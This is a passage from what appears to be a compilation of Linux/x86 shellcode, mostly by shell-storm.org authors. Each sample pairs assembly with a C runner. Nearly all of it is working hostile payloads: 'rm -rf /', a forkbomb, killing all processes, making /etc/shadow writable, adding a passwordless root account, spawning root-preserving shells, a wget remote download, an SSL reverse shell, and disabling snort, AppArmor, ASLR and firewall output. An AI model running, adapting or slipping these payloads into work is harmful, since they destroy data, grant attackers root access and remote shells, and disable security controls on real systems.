  "\x31\xdb"			// xor	%ebx, %ebx
  "\xcd\x80"			// int	$0x80
  "\x6a\x2e"			// push	$0x2e
  "\x58"			// pop	%eax
  "\x53"			// push %ebx
  "\xcd\x80"			// int	$0x80
  "\x31\xd2"			// xor	%edx, %edx
  "\x6a\x0b"			// push	$0xb
  "\x58"			// pop	%eax
  "\x52"			// push	%edx
  "\x70\x61\x63\x65"            // push $0x65636170
  "\x76\x61\x5f\x73"            // push $0x735f6176
  "\x69\x7a\x65\x5f"            // push $0x5f657a69
  "\x6e\x64\x6f\x6d"            // push $0x6d6f646e
  "\x6c\x2f\x72\x61"            // push $0x61722f6c
  "\x65\x72\x6e\x65"            // push $0x656e7265
  "\x73\x2f\x2f\x6b"            // push $0x6b2f2f73
  "\x2f\x2f\x73\x79"            // push $0x79732f2f
  "\x70\x72\x6f\x63"            // push $0x636f7270
  "\x20\x3e\x20\x2f"            // push $0x2f203e20
  "\x68\x6f\x20\x30"            // push $0x30206f68
  "\x2f\x2f\x65\x63"            // push $0x63652f2f
  "\x2f\x62\x69\x6e"            // push $0x6e69622f
  "\x89\xe3"			// mov	%esp, %ebx
  "\x52"			// push	%edx
  "\x53"			// push	%ebx
  "\x89\xe1"			// mov	%esp, %ecx
  "\xcd\x80";			// int	$0x80
 
int main()
{
	int (*fp)() = (int(*)())sc;
    	printf("bytes: %u\n", strlen(sc));
    	fp();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* By Kris Katterjohn 11/18/2006
 *
 * 12 byte shellcode to set system time to 0 and exit. No real damage :)
 *
 * exit() code is the last 5 bytes (0x6a - 0x80)
 *
 * for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; stime([0])
 *
 *      push byte 25
 *      pop eax
 *      cdq
 *      push edx
 *      mov ebx, esp
 *      int 0x80
 *
 * ; exit()
 *
 *      inc eax
 *      int 0x80
 */

main()
{
       char shellcode[] = "\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80";

       (*(void (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* By Kris Katterjohn 11/13/2006
 *
 * 11 byte shellcode to kill all processes for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; kill(-1, SIGKILL)
 *
 *      push byte 37
 *      pop eax
 *      push byte -1
 *      pop ebx
 *      push byte 9
 *      pop ecx
 *      int 0x80
 */

main()
{
       char shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

       (*(void (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* By Kris Katterjohn 11/18/2006
 *
 * 40 byte shellcode to flush ipchains for Linux x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; execve("/sbin/ipchains", { "/sbin/ipchains", "-F", NULL }, NULL)
 *
 *      push byte 11
 *      pop eax
 *      cdq
 *      push edx
 *      push word 0x462d
 *      mov ecx, esp
 *      push edx
 *      push word 0x736e
 *      push 0x69616863
 *      push 0x70692f6e
 *      push 0x6962732f
 *      mov ebx, esp
 *      push edx
 *      push ecx
 *      push ebx
 *      mov ecx, esp
 *      int 0x80
 */

main()
{
       char shellcode[] =
               "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x46\x89"
               "\xe1\x52\x66\x68\x6e\x73\x68\x63\x68\x61"
               "\x69\x68\x6e\x2f\x69\x70\x68\x2f\x73\x62"
               "\x69\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

       (*(void (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* By Kris Katterjohn 8/29/2006
 *
 * 7 byte shellcode for a forkbomb
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *      push byte 2
 *      pop eax
 *      int 0x80
 *      jmp short _start
 */

main()
{
       char shellcode[] = "\x6a\x02\x58\xcd\x80\xeb\xf9";

       (*(void (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* By Kris Katterjohn 11/18/2006
 *
 * 45 byte shellcode to execve("rm -rf /") for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; execve("/bin/rm", { "/bin/rm", "-r", "-f", "/", NULL }, NULL)
 *
 *      push byte 11
 *      pop eax
 *      cdq
 *      push edx
 *      push byte 0x2f
 *      mov edi, esp
 *      push edx
 *      push word 0x662d
 *      mov esi, esp
 *      push edx
 *      push word 0x722d
 *      mov ecx, esp
 *      push edx
 *      push 0x6d722f2f
 *      push 0x6e69622f
 *      mov ebx, esp
 *      push edx
 *      push edi
 *      push esi
 *      push ecx
 *      push ebx
 *      mov ecx, esp
 *      int 0x80
 */

main()
{
       char shellcode[] =
               "\x6a\x0b\x58\x99\x52\x6a\x2f\x89\xe7\x52\x66\x68\x2d\x66\x89"
               "\xe6\x52\x66\x68\x2d\x72\x89\xe1\x52\x68\x2f\x2f\x72\x6d\x68"
               "\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x51\x53\x89\xe1\xcd\x80";

       (*(void (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* By Kris Katterjohn 8/29/2006
 *
 * 36 byte shellcode to chmod("/etc/shadow", 0666) and exit for Linux/x86
 *
 * To remove exit(): Remove the last 5 bytes (0x6a - 0x80)
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *      xor edx, edx
 *
 *      push byte 15
 *      pop eax
 *      push edx
 *      push byte 0x77
 *      push word 0x6f64
 *      push 0x6168732f
 *      push 0x6374652f
 *      mov ebx, esp
 *      push word 0666Q
 *      pop ecx
 *      int 0x80
 *
 *      push byte 1
 *      pop eax
 *      int 0x80
 */

main()
{
       char shellcode[] =
               "\x31\xd2\x6a\x0f\x58\x52\x6a\x77\x66\x68\x64\x6f\x68"
               "\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\x68"
               "\xb6\x01\x59\xcd\x80\x6a\x01\x58\xcd\x80";

       (*(void (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* By Kris Katterjohn 11/14/2006
 *
 * 69 byte shellcode to add root user 'r00t' with no password to /etc/passwd
 *
 * for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; open("/etc//passwd", O_WRONLY | O_APPEND)
 *
 *      push byte 5
 *      pop eax
 *      xor ecx, ecx
 *      push ecx
 *      push 0x64777373
 *      push 0x61702f2f
 *      push 0x6374652f
 *      mov ebx, esp
 *      mov cx, 02001Q
 *      int 0x80
 *
 *      mov ebx, eax
 *
 * ; write(ebx, "r00t::0:0:::", 12)
 *
 *      push byte 4
 *      pop eax
 *      xor edx, edx
 *      push edx
 *      push 0x3a3a3a30
 *      push 0x3a303a3a
 *      push 0x74303072
 *      mov ecx, esp
 *      push byte 12
 *      pop edx
 *      int 0x80
 *
 * ; close(ebx)
 *
 *      push byte 6
 *      pop eax
 *      int 0x80
 *
 * ; exit()
 *
 *      push byte 1
 *      pop eax
 *      int 0x80
 */

main()
{
       char shellcode[] =
               "\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68"
               "\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66"
               "\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\x31\xd2"
               "\x52\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68"
               "\x72\x30\x30\x74\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a"
               "\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80";

       (*(void (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
08048334 <main>:
 8048334:   99                      cltd
 8048335:   6a 0b                   push   $0xb
 8048337:   58                      pop    %eax
 8048338:   60                      pusha
 8048339:   59                      pop    %ecx
 804833a:   cd 80                   int    $0x80
 
using this code.
 
step1. This code is compiled.
step2. strace -x output binary
step3. get execve args in strace result.
step4. create link execve args on /bin/sh
 
*/
 
unsigned char sc[]=
"\x99\x6a\x0b\x58\x60\x59\xcd\x80";
int main()
{
    void (*p)();
    p = sc;
    p();
}
 
have a nice day~
 
thx~



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

Title: 	Linux x86 - polymorphic execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 57 bytes
Author:	Jonathan Salwan
Mail:	submit@shell-storm.org
Web:	http://www.shell-storm.org

!Database of Shellcodes http://www.shell-storm.org/shellcode/


sh sets (euid, egid) to (uid, gid) if -p not supplied and uid < 100
Read more: http://www.faqs.org/faqs/unix-faq/shell/bash/#ixzz0mzPmJC49

Based on http://www.shell-storm.org/shellcode/files/shellcode-606.php
*/

#include <stdio.h>

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x21\x80"
		   "\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  		   "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
		   "\x6b\x0c\x59\x9a\x53\x67\x69\x2e"
		   "\x71\x8a\xe2\x53\x6b\x69\x69\x30"
		   "\x63\x62\x74\x69\x30\x63\x6a\x6f"
		   "\x8a\xe4\x53\x52\x54\x8a\xe2\xce"
		   "\x81";

int main(int argc, char *argv[])
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();       
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

Title: 	Linux x86 - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 33 bytes
Author:	Jonathan Salwan
Mail:	submit@shell-storm.org
Web:	http://www.shell-storm.org

!Database of Shellcodes http://www.shell-storm.org/shellcode/


sh sets (euid, egid) to (uid, gid) if -p not supplied and uid < 100
Read more: http://www.faqs.org/faqs/unix-faq/shell/bash/#ixzz0mzPmJC49

sassembly of section .text:

08048054 <.text>:
 8048054:	6a 0b                	push   $0xb
 8048056:	58                   	pop    %eax
 8048057:	99                   	cltd   
 8048058:	52                   	push   %edx
 8048059:	66 68 2d 70          	pushw  $0x702d
 804805d:	89 e1                	mov    %esp,%ecx
 804805f:	52                   	push   %edx
 8048060:	6a 68                	push   $0x68
 8048062:	68 2f 62 61 73       	push   $0x7361622f
 8048067:	68 2f 62 69 6e       	push   $0x6e69622f
 804806c:	89 e3                	mov    %esp,%ebx
 804806e:	52                   	push   %edx
 804806f:	51                   	push   %ecx
 8048070:	53                   	push   %ebx
 8048071:	89 e1                	mov    %esp,%ecx
 8048073:	cd 80                	int    $0x80

*/

#include <stdio.h>

char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";

int main(int argc, char *argv[])
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();       
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title: 	 Linux x86 - Remote file Download - 42 bytes
Author:	 Jonathan Salwan <submit AT shell-storm.org>
Web:	 http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan


!Database of Shellcodes http://www.shell-storm.org/shellcode/


08048054 <.text>:
 8048054:	6a 0b                	push   $0xb
 8048056:	58                   	pop    %eax
 8048057:	99                   	cltd   
 8048058:	52                   	push   %edx
 8048059:	68 61 61 61 61       	push   $0x61616161
 804805e:	89 e1                	mov    %esp,%ecx
 8048060:	52                   	push   %edx
 8048061:	6a 74                	push   $0x74
 8048063:	68 2f 77 67 65       	push   $0x6567772f
 8048068:	68 2f 62 69 6e       	push   $0x6e69622f
 804806d:	68 2f 75 73 72       	push   $0x7273752f
 8048072:	89 e3                	mov    %esp,%ebx
 8048074:	52                   	push   %edx
 8048075:	51                   	push   %ecx
 8048076:	53                   	push   %ebx
 8048077:	89 e1                	mov    %esp,%ecx
 8048079:	cd 80                	int    $0x80
 804807b:	40                   	inc    %eax
 804807c:	cd 80                	int    $0x80
*/

#include <stdio.h>

char sc[] = 	"\x6a\x0b\x58\x99\x52"
		"\x68\x61\x61\x61\x61" // Change it
		"\x89\xe1\x52\x6a\x74"
		"\x68\x2f\x77\x67\x65"
		"\x68\x2f\x62\x69\x6e"
		"\x68\x2f\x75\x73\x72"
		"\x89\xe3\x52\x51\x53"
		"\x89\xe1\xcd\x80\x40"
		"\xcd\x80";

int main(void)
{
       	fprintf(stdout,"Length: %d\n",strlen(sc));
	(*(void(*)()) sc)();
     
return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
**
** Title:     Linux/x86-32 - ConnectBack with SSL connection - 422 bytes
** Date:      2011-06-08
** Tested on: ArchLinux i686
** Author:    Jonathan Salwan - twitter: @jonathansalwan
**
** http://shell-storm.org
**
**
** Configurations server
** ===========================================================================
** jonathan@ArchLinux [ssl] $ openssl genrsa -des3 -out server.key 1024
** jonathan@ArchLinux [ssl] $ openssl req -new -key server.key -out server.csr
** jonathan@ArchLinux [ssl] $ cp server.key server.key.org
** jonathan@ArchLinux [ssl] $ openssl rsa -in server.key.org -out server.key
** jonathan@ArchLinux [ssl] $ openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
** jonathan@ArchLinux [ssl] $ ll
** total 16
** -rw-r--r-- 1 jonathan users 757 Jun  8 09:36 server.crt
** -rw-r--r-- 1 jonathan users 603 Jun  8 09:36 server.csr
** -rw-r--r-- 1 jonathan users 887 Jun  8 09:36 server.key
** -rw-r--r-- 1 jonathan users 963 Jun  8 09:36 server.key.org
** jonathan@ArchLinux [ssl] $
**
**
** Running server
** ===========================================================================
** jonathan@ArchLinux [ssl] $ openssl s_server -key server.key -cert server.crt -accept 8080
**
**
** After the server was opened, you can send the shellcode.
** Warning! The client need tsch and openssl installed. 
**
**
** Informations shellcode
** ===========================================================================
**
** Reverse TCP with SSL (why not)
** Linux x86 32bits
** 422 bytes
**
**
** ASM sources
** =========================================================================== 
**
** 08048054 <main>:
** 8048054:     31 c0                     xor    %eax,%eax
** 8048056:     50                        push   %eax
** 8048057:     6a 65                     push   $0x65
** 8048059:     68 6b 70 69 70            push   $0x7069706b
** 804805e:     68 2f 62 61 63            push   $0x6361622f
** 8048063:     68 2f 74 6d 70            push   $0x706d742f
** 8048068:     89 e3                     mov    %esp,%ebx
** 804806a:     b0 0a                     mov    $0xa,%al
** 804806c:     cd 80                     int    $0x80
** 804806e:     85 c0                     test   %eax,%eax
** 8048070:     75 32                     jne    80480a4 <del2>
** 8048072:     31 c0                     xor    %eax,%eax
** 8048074:     31 db                     xor    %ebx,%ebx
** 8048076:     31 d2                     xor    %edx,%edx
** 8048078:     b3 01                     mov    $0x1,%bl
** 804807a:     31 c0                     xor    %eax,%eax
** 804807c:     50                        push   %eax
** 804807d:     6a 6e                     push   $0x6e
** 804807f:     66 68 64 5c               pushw  $0x5c64
** 8048083:     68 6c 65 74 65            push   $0x6574656c
** 8048088:     68 65 20 64 65            push   $0x65642065
** 804808d:     68 6b 70 69 70            push   $0x7069706b
** 8048092:     68 2f 62 61 63            push   $0x6361622f
** 8048097:     68 2f 74 6d 70            push   $0x706d742f
** 804809c:     89 e1                     mov    %esp,%ecx
** 804809e:     b2 17                     mov    $0x17,%dl
** 80480a0:     b0 04                     mov    $0x4,%al
** 80480a2:     cd 80                     int    $0x80

** 080480a4 <del2>:
** 80480a4:     31 c0                     xor    %eax,%eax
** 80480a6:     50                        push   %eax
** 80480a7:     66 68 73 6c               pushw  $0x6c73
** 80480ab:     68 2f 63 62 73            push   $0x7362632f
** 80480b0:     68 2f 74 6d 70            push   $0x706d742f
** 80480b5:     89 e3                     mov    %esp,%ebx
** 80480b7:     b0 0a                     mov    $0xa,%al
** 80480b9:     cd 80                     int    $0x80
** 80480bb:     85 c0                     test   %eax,%eax
** 80480bd:     75 2a                     jne    80480e9 <open>
** 80480bf:     31 c0                     xor    %eax,%eax
** 80480c1:     31 db                     xor    %ebx,%ebx
** 80480c3:     31 d2                     xor    %edx,%edx
** 80480c5:     50                        push   %eax
** 80480c6:     68 65 64 5c 6e            push   $0x6e5c6465
** 80480cb:     68 65 6c 65 74            push   $0x74656c65
** 80480d0:     68 73 6c 20 64            push   $0x64206c73
** 80480d5:     68 2f 63 62 73            push   $0x7362632f
** 80480da:     68 2f 74 6d 70            push   $0x706d742f
** 80480df:     89 e1                     mov    %esp,%ecx
** 80480e1:     b3 01                     mov    $0x1,%bl
** 80480e3:     b2 14                     mov    $0x14,%dl
** 80480e5:     b0 04                     mov    $0x4,%al
** 80480e7:     cd 80                     int    $0x80
**
** 080480e9 <open>:
** 80480e9:     31 c0                     xor    %eax,%eax
** 80480eb:     31 c9                     xor    %ecx,%ecx
** 80480ed:     31 d2                     xor    %edx,%edx
** 80480ef:     66 b9 41 04               mov    $0x441,%cx
** 80480f3:     66 ba a4 01               mov    $0x1a4,%dx
** 80480f7:     50                        push   %eax
** 80480f8:     66 68 73 6c               pushw  $0x6c73
** 80480fc:     68 2f 63 62 73            push   $0x7362632f
** 8048101:     68 2f 74 6d 70            push   $0x706d742f
** 8048106:     89 e3                     mov    %esp,%ebx
** 8048108:     b0 05                     mov    $0x5,%al
** 804810a:     cd 80                     int    $0x80
** 804810c:     89 c6                     mov    %eax,%esi
**
** 0804810e <wtite>:
** 804810e:     31 d2                     xor    %edx,%edx
** 8048110:     89 f3                     mov    %esi,%ebx
** 8048112:     31 c0                     xor    %eax,%eax
** 8048114:     50                        push   %eax
** 8048115:     66 68 70 65               pushw  $0x6570
** 8048119:     68 63 6b 70 69            push   $0x69706b63
** 804811e:     68 70 2f 62 61            push   $0x61622f70
** 8048123:     68 3e 2f 74 6d            push   $0x6d742f3e
** 8048128:     68 73 68 20 31            push   $0x31206873
** 804812d:     68 6e 2f 74 63            push   $0x63742f6e
** 8048132:     68 20 2f 62 69            push   $0x69622f20
** 8048137:     68 70 65 20 7c            push   $0x7c206570
** 804813c:     68 63 6b 70 69            push   $0x69706b63
** 8048141:     68 70 2f 62 61            push   $0x61622f70
** 8048146:     68 3c 2f 74 6d            push   $0x6d742f3c
**
** 804814b:     68 38 30 20 30            push   $0x30203038  "\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a\x38\x30\x38\x30"
** 8048150:     68 74 3a 38 30            push   $0x30383a74  localhost:8080
** 8048155:     68 6c 68 6f 73            push   $0x736f686c  If you change that, you need to change write(..., ..., size_t) (%edx) 
** 804815a:     68 6c 6f 63 61            push   $0x61636f6c
**
** 804815f:     68 65 63 74 20            push   $0x20746365
** 8048164:     68 63 6f 6e 6e            push   $0x6e6e6f63
** 8048169:     68 6e 74 20 2d            push   $0x2d20746e
** 804816e:     68 63 6c 69 65            push   $0x65696c63
** 8048173:     68 6c 20 73 5f            push   $0x5f73206c
** 8048178:     68 65 6e 73 73            push   $0x73736e65
** 804817d:     68 6e 2f 6f 70            push   $0x706f2f6e
** 8048182:     68 72 2f 62 69            push   $0x69622f72
** 8048187:     68 20 2f 75 73            push   $0x73752f20
** 804818c:     68 70 20 26 26            push   $0x26262070
** 8048191:     68 69 70 65 20            push   $0x20657069
** 8048196:     68 61 63 6b 70            push   $0x706b6361
** 804819b:     68 6d 70 2f 62            push   $0x622f706d
** 80481a0:     68 64 20 2f 74            push   $0x742f2064
** 80481a5:     68 6d 6b 6e 6f            push   $0x6f6e6b6d
** 80481aa:     89 e1                     mov    %esp,%ecx
** 80481ac:     b2 77                     mov    $0x77,%dl
** 80481ae:     31 c0                     xor    %eax,%eax
** 80481b0:     b0 04                     mov    $0x4,%al
** 80481b2:     cd 80                     int    $0x80
**
** 080481b4 <close>:
** 80481b4:     31 c0                     xor    %eax,%eax
** 80481b6:     b0 06                     mov    $0x6,%al
** 80481b8:     89 f3                     mov    %esi,%ebx
** 80481ba:     cd 80                     int    $0x80
**
** 080481bc <execve>:
** 80481bc:     31 c0                     xor    %eax,%eax
** 80481be:     50                        push   %eax
** 80481bf:     66 68 73 6c               pushw  $0x6c73
** 80481c3:     68 2f 63 62 73            push   $0x7362632f
** 80481c8:     68 2f 74 6d 70            push   $0x706d742f
** 80481cd:     89 e3                     mov    %esp,%ebx
** 80481cf:     50                        push   %eax
** 80481d0:     66 68 2d 65               pushw  $0x652d
** 80481d4:     89 e1                     mov    %esp,%ecx
** 80481d6:     50                        push   %eax
** 80481d7:     6a 68                     push   $0x68
** 80481d9:     66 68 2f 73               pushw  $0x732f
** 80481dd:     68 2f 62 69 6e            push   $0x6e69622f
** 80481e2:     89 e2                     mov    %esp,%edx
** 80481e4:     50                        push   %eax
** 80481e5:     53                        push   %ebx
** 80481e6:     51                        push   %ecx
** 80481e7:     52                        push   %edx
** 80481e8:     89 e1                     mov    %esp,%ecx
** 80481ea:     89 d3                     mov    %edx,%ebx
** 80481ec:     31 d2                     xor    %edx,%edx
** 80481ee:     b0 0b                     mov    $0xb,%al
** 80481f0:     cd 80                     int    $0x80
**
** 080481f2 <exit>:
** 80481f2:     31 c0                     xor    %eax,%eax
** 80481f4:     b0 01                     mov    $0x1,%al
** 80481f6:     31 db                     xor    %ebx,%ebx
** 80481f8:     cd 80                     int    $0x80
**
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char SC[] = "\x31\xc0\x50\x6a\x65\x68\x6b\x70\x69\x70\x68\x2f\x62\x61\x63"
            "\x68\x2f\x74\x6d\x70\x89\xe3\xb0\x0a\xcd\x80\x85\xc0\x75\x32"
            "\x31\xc0\x31\xdb\x31\xd2\xb3\x01\x31\xc0\x50\x6a\x6e\x66\x68"
            "\x64\x5c\x68\x6c\x65\x74\x65\x68\x65\x20\x64\x65\x68\x6b\x70"
            "\x69\x70\x68\x2f\x62\x61\x63\x68\x2f\x74\x6d\x70\x89\xe1\xb2"
            "\x17\xb0\x04\xcd\x80\x31\xc0\x50\x66\x68\x73\x6c\x68\x2f\x63"
            "\x62\x73\x68\x2f\x74\x6d\x70\x89\xe3\xb0\x0a\xcd\x80\x85\xc0"
            "\x75\x2a\x31\xc0\x31\xdb\x31\xd2\x50\x68\x65\x64\x5c\x6e\x68"
            "\x65\x6c\x65\x74\x68\x73\x6c\x20\x64\x68\x2f\x63\x62\x73\x68"
            "\x2f\x74\x6d\x70\x89\xe1\xb3\x01\xb2\x14\xb0\x04\xcd\x80\x31"
            "\xc0\x31\xc9\x31\xd2\x66\xb9\x41\x04\x66\xba\xa4\x01\x50\x66"
            "\x68\x73\x6c\x68\x2f\x63\x62\x73\x68\x2f\x74\x6d\x70\x89\xe3"
            "\xb0\x05\xcd\x80\x89\xc6\x31\xd2\x89\xf3\x31\xc0\x50\x66\x68"
            "\x70\x65\x68\x63\x6b\x70\x69\x68\x70\x2f\x62\x61\x68\x3e\x2f"
            "\x74\x6d\x68\x73\x68\x20\x31\x68\x6e\x2f\x74\x63\x68\x20\x2f"
            "\x62\x69\x68\x70\x65\x20\x7c\x68\x63\x6b\x70\x69\x68\x70\x2f"
            "\x62\x61\x68\x3c\x2f\x74\x6d"
            /* localhost:8080 */
            "\x68\x38\x30\x20\x30\x68\x74\x3a\x38\x30\x68\x6c\x68\x6f\x73"
            "\x68\x6c\x6f\x63\x61"
            /* EOF */
            "\x68\x65\x63\x74\x20\x68\x63\x6f\x6e\x6e\x68\x6e\x74\x20\x2d"
            "\x68\x63\x6c\x69\x65\x68\x6c\x20\x73\x5f\x68\x65\x6e\x73\x73"
            "\x68\x6e\x2f\x6f\x70\x68\x72\x2f\x62\x69\x68\x20\x2f\x75\x73"
            "\x68\x70\x20\x26\x26\x68\x69\x70\x65\x20\x68\x61\x63\x6b\x70"
            "\x68\x6d\x70\x2f\x62\x68\x64\x20\x2f\x74\x68\x6d\x6b\x6e\x6f"
            "\x89\xe1\xb2\x77\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x06\x89"
            "\xf3\xcd\x80\x31\xc0\x50\x66\x68\x73\x6c\x68\x2f\x63\x62\x73"
            "\x68\x2f\x74\x6d\x70\x89\xe3\x50\x66\x68\x2d\x65\x89\xe1\x50"
            "\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe2\x50\x53"
            "\x51\x52\x89\xe1\x89\xd3\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\xb0"
            "\x01\x31\xdb\xcd\x80";


int main(void)
{
   fprintf(stdout,"Length: %d\n",strlen(SC));
   (*(void(*)()) SC)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Title: 	Polymorphic Shellcode /bin/sh - 48 bytes
 Author: 	Jonathan Salwan
 Mail:		submit [!] shell-storm.org 

 	! DataBase of shellcode : http://www.shell-storm.org/shellcode/


 Original Informations
 =====================

 Disassembly of section .text:

  08048060  <.text>:
  8048060:	 31 c0                	 xor    %eax,%eax
  8048062:	 50                   	 push   %eax
  8048063:	 68 2f 2f 73 68       	 push   $0x68732f2f
  8048068:	 68 2f 62 69 6e       	 push   $0x6e69622f
  804806d:	 89 e3                	 mov    %esp,%ebx
  804806f:	 50                   	 push   %eax
  8048070:	 53                   	 push   %ebx
  8048071:	 89 e1                	 mov    %esp,%ecx
  8048073:	 99                   	 cltd   
  8048074:	 b0 0b                	 mov    $0xb,%al
  8048076:	 cd 80                	 int    $0x80


*/

#include "stdio.h"

char shellcode[] = 	"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
			"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
			"\x32\xc1\x51\x69\x30\x30\x74\x69"
			"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
			"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81";

int main()
{
	printf("Polymorphic Shellcode - length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
	
	return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Name = John Babio
Twitter = 3vi1john

/usr/bin/killall snort

const char sc[] = "\x31\xc0\x50\x6a\x74\x68\x73\x6e\x6f\x72\x89\xe6\x50\x68\x6c\x61\x6c\x6c\x68\x2f\x6b"
"\x69\x6c\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x56\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
main(){
      int (*shell)();
      shell=sc;
      shell();
    }

8048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       50                      push   %eax
 8048063:       6a 74                   push   $0x74
 8048065:       68 73 6e 6f 72          push   $0x726f6e73
 804806a:       89 e6                   mov    %esp,%esi
 804806c:       50                      push   %eax
 804806d:       68 6c 61 6c 6c          push   $0x6c6c616c
 8048072:       68 2f 6b 69 6c          push   $0x6c696b2f
 8048077:       68 2f 62 69 6e          push   $0x6e69622f
 804807c:       68 2f 75 73 72          push   $0x7273752f
 8048081:       89 e3                   mov    %esp,%ebx
 8048083:       50                      push   %eax
 8048084:       56                      push   %esi
 8048085:       53                      push   %ebx
 8048086:       89 e1                   mov    %esp,%ecx
 8048088:       31 d2                   xor    %edx,%edx
 804808a:       b0 0b                   mov    $0xb,%al
 804808c:       cd 80                   int    $0x80



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Name = John Babio
Twitter = 3vi1john

/etc/init.d/apparmor teardown

const char sc[] = "\x6a\x0b\x58\x31\xd2\x52\x68\x64\x6f\x77\x6e\x68\x74\x65\x61\x72\x89\xe1"
"\x52\x68\x72\x6d\x6f\x72\x68\x61\x70\x70\x61\x68\x74\x2e\x64\x2f\x68\x2f\x69\x6e\x69\x68\x2f"
"\x65\x74\x63\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

main(){
      int (*shell)();
      shell=sc;
      shell();
    }

08048060 <_start>:
 8048060:    6a 0b                    push   $0xb
 8048062:    58                       pop    %eax
 8048063:    31 d2                    xor    %edx,%edx
 8048065:    52                       push   %edx
 8048066:    68 64 6f 77 6e           push   $0x6e776f64
 804806b:    68 74 65 61 72           push   $0x72616574
 8048070:    89 e1                    mov    %esp,%ecx
 8048072:    52                       push   %edx
 8048073:    68 72 6d 6f 72           push   $0x726f6d72
 8048078:    68 61 70 70 61           push   $0x61707061
 804807d:    68 74 2e 64 2f           push   $0x2f642e74
 8048082:    68 2f 69 6e 69           push   $0x696e692f
 8048087:    68 2f 65 74 63           push   $0x6374652f
 804808c:    89 e3                    mov    %esp,%ebx
 804808e:    52                       push   %edx
 804808f:    51                       push   %ecx
 8048090:    53                       push   %ebx
 8048091:    89 e1                    mov    %esp,%ecx
 8048093:    cd 80                    int    $0x80





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Name = John Babio
Twitter = 3vi1john
Arch = Linux/x86-32 bits

Code ///sbin/iptables -POUTPUT DROP(Policy of drop to OUTPUT chain)

const char sc[] = 
"\x31\xc0\x31\xd2\x50\x68\x44\x52\x4f\x50\x89\xe7\x50\x68\x54\x50\x55\x54\x68\x2d"
